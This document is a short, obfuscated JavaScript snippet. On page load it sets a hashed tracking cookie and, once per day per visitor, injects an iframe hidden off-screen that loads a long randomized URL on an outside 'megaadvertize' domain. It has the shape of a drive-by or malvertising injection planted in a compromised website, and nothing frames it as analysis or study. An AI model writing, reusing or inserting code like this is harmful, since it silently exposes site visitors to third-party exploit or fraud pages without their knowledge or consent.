window.onload = function() {
    function x22bq(a, b, c) {
        if (c) {
            var d = new Date();
            d.setDate(d.getDate() + c);
        }
        if (a && b) document.cookie = a + '=' + b + (c ? '; expires=' + d.toUTCString() : '');
        else return false;
    }

    function x33bq(a) {
        var b = new RegExp(a + '=([^;]){1,}');
        var c = b.exec(document.cookie);
        if (c) c = c[0].split('=');
        else return false;
        return c[1] ? c[1] : false;
    }
    var x33dq = x33bq("3b3006f930d1dc64bbe768bc134a93c1");
    if (x33dq != "c5f216cb50681849c6cda3d3bdca029c") {
        x22bq("3b3006f930d1dc64bbe768bc134a93c1", "c5f216cb50681849c6cda3d3bdca029c", 1);
        var x22dq = document.createElement("div");
        var x22qq = "http://img.ogromnuebylochi.info/megaadvertize/?OcFhVelwuWqnPjrqsAV=jlLTpvOGs&esubYmyj=FyGdRzRkqqBbJthbH&kjNRkrwRP=DGTBNEDaP&OCNqjYU=fFAzrYFlSaKxdQ&YBQShXdo=BPPainEscpNi&IIcRAECvzqJTnecNFDrz=quunmJsAE&keyword=c7123406814f332b6f4a344fca5f1ef6&XIvFuqNXLeJfW=WHQfcDuZF&reVWpXyK=aObGPlWXUrU&KkwtwkzvphJq=QitbxxGpYmjOlcrc&RPAUpkFYgM=reGIAiYRHFr";
        x22dq.innerHTML = "<div style='position:absolute;z-index:1000;top:-1000px;left:-9999px;'><iframe src='" + x22qq + "'></iframe></div>";
        document.body.appendChild(x22dq);
    }
}
